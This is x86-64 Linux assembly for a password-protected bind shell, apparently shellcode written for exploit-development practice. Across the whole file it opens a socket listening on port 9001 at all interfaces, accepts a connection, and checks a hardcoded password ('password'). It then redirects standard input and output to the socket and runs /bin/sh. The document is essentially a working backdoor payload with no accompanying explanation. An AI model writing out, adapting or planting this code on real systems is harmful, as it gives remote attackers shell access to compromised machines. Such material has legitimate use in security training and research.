global _start

section .text

_start:

; syscall socket()

    push 0x29
    pop rax                        ; syscall socket = 41
    push 0x02
    pop rdi                        ; AF_INET = 2
    push 0x01
    pop rsi                        ; SOCKET_STREAM = 1
    cdq                            ; rdx = 0
    syscall
    mov rdi, rax                   ; store for future references
    
; syscall bind()

    push 0x31
    pop rax                        ; syscall bind = 49
    push rdx
    push rdx                       ; 0.0.0.0
    push word 0x2923               ; port 9001
    push word 0x02                 ; AF_INET = 2
    mov rsi, rsp                   ; stack pointer
    add rdx, 0x10                  ; addrlen = 16
    syscall
    
; syscall listen()

    push 0x32
    pop rax                        ; syscall listen = 50
    ; rdi = already setup
    xor rsi, rsi                   ; rsi = 0
    syscall
    
; syscall accept()

    push 0x2b
    pop rax                        ; = 43
    ; rsi + rsi is already setup
    mov rdx, rsi                   ; RDX = 0
    syscall
    mov r9, rax                    ; save fd for future references

; authenticate:

    mov rax, rsi                   ; syscall read = 0
    mov rdi, r9                    ; reference to stored file descriptor
    sub rsp, 0x1e
    mov rsi, rsp                   ; allocating space in the stack
    mov dl, 0x1e                   ; bytes to read
    syscall

; compare:

    mov rax, 0x64726f7773736170    ; hardcoded password in little endian "drowssap"  
    mov rdi, rsi                   ; password
    scasq                          ; compare rax with rdi
    jne end                        ; if is password incorrect jump to end

; syscall dup2()

    push 0x02
    pop rsi                        ; rsi = 2
    mov rdi, r9                    ; rdi -> file descriptor

loop:
    push 0x21
    pop rax                        ; syscall dup2 = 33
    syscall
    dec rsi                        ; decrement fd
    jns loop
  
; syscall execve()

    push 0x3b                      ; = 59
    pop rax                        ; syscall execve()
    cdq                    
    mov rbx, 0x68732f6e69622f      ; "hs/nib/"
    push rbx                     
    mov rdi, rsp                   ; RSI -> RDI -> pathname = /bin/sh,0x0  
    push rdx                       ; RDX = 0
    push rdi
    mov rsi, rsp
    syscall                        ; executing syscall execve()
    
end:

    push 0x3c
    pop rax                        ; rax = 60
    syscall
